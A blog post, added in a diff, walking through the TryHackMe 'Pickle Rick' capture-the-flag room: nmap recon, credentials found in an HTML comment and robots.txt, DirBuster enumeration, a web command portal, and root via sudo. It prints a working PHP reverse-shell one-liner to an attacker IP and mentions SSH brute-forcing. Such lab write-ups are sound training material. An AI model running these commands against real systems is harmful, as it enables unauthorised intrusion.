@@ -1,0 +1,120 @@
+---
+title: "Tryhackme's Pickle Rick Writeup"
+description: "A write-up for the Pickle Rick challenge in TryHackMe"
+pubDate: "Jul 04 2025"
+tags: ["TryHackMe", "OWASP", "Hacking", "Writeup"]
+---
+## Introduction
+
+Today I will be detailing my journey into breaking into the Pickle Rick machine from TryHackMe.com
+
+Before reading my breakdown, I highly recommend you attempt it for yourself here: [Pickle Rick](https://tryhackme.com/room/picklerick)
+With that out of the way, let's get started.
+
+## Reconnaissance
+
+The very first thing one should do when starting a new challenge room is an nmap scan of the app so we can start figuring out some attack vectors.
+
+I performed a simple nmap scan with the following command:
+
+```bash
+sudo nmap -sS TARGET
+
+
+```
+My initial scan revealed two open ports:
+
+|PORT   |STATE |SERVICE |
+|-------|------|--------|
+|22/tcp | open | ssh    |
+|80/tcp | open | http   |
+
+Since we have an open http port and the challenge itself did mention exploiting a web server, it seemed like the next logical step would be to plug the IP address into a web browser to see if we can figure out some attack vectors from the website.
+
+![Screen capture of the web server](/res/blog/en/pickle-rick/figure1.png)
+
+At first glance nothing is really going on in this server, but after taking a look at the source code, we can find a single username.
+
+```html
+<!DOCTYPE html>
+<html>
+    <head>...</head>
+    <body>
+        <div class="container" >...</div>
+        <!--
+            Note to self, remember username!
+            Username: R1ckRul3s
+          -->
+    </body>
+</html>
+```
+
+Ok! We have our username!
+
+:::callout{.blue}
+At this point in the reconnaissance, I figured I could try to SSH into the machine with the username by brute-forcing the password.
+This did not work, but it did send me into a "learning-how-SSH-works" rabbit hole that lasted a full day.
+:::
+
+Now we have run out of things to explore with what we know of the machine, so it's time to do some more reconnaissance.
+
+This time, we will use DirBuster to enumerate all pages in the web app.
+
+:::callout{.red}
+Here I made the mistake of not really understanding how BirBuster worked, and not taking the time to google a good way to use it, resulting in me
+missing some very important directories (namely login.php)
+I ended up finding it after just copying a tutorial on DirBuster off YouTube.
+:::
+
+The DirBuster program returns a good amount of directories, but most give a forbidden 403 response. These are the ones that didn't
+
+- /assets
+- /assets/bootsrap.min.js
+- /denied.php
+- /index.html
+- /login.php
+- /portal.php
+- /robots.txt
+- /icons/small
+
+After visiting each and every one, these were the interesting ones:
+- /login.php (Contains a login form where we can plug in our credentials)
+- /robots.txt (Contains a string that is likely to be a password)
+
+This is starting to get interesting!
+
+## Exploitation
+
+So we have a username: R1ckRul3s.
+And a password: Wubbalubbadubdub.
+
+Great, once we plug them in on /login.php, we are sent to /portal.php, where we can input commands.
+
+After experimenting a bit with the commands, two things became apparent.
+1. One of the flags is right there! (ls)
+2. The most useful commands don't work! (cat ingredient.txt)
+
+Here is where having some good resources becomes incredibly helpful. In order to solve this challenge, I just visited my favorite [reverse shell cheat sheet](https://highon.coffee/blog/reverse-shell-cheat-sheet/) and stole a command.
+The command that got me my shell was
+
+```shell
+php -r '$sock=fsockopen("MY_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+If you're going to grab it, just replace MY_IP with, well, your IP.
+
+After getting the first flag and exploring a bit inside the machine, I managed to find the second flag.
+But at this point I explored every inch of the machine I __had access to__, and I still couldn't find the third flag.
+We need to go deeper.
+
+## Going deeper (privilege escalation)
+
+This time, privilege escalation was a bit of a joke. All I did was `ls /bin` and I compared each binary with [the GTFOBins repository](https://gtfobins.github.io/) to find one that let me escalate into root. It didn't take long.
+
+The command that got me root ended up being
+```bash
+sudo bash
+```
+After that I found the third flag inside /root, beating the machine.
+
+## Conclusion
+This was a pretty fun, beginner-friendly challenge that let me practice my skills while always making the intended path quite obvious. Definitely recommend.
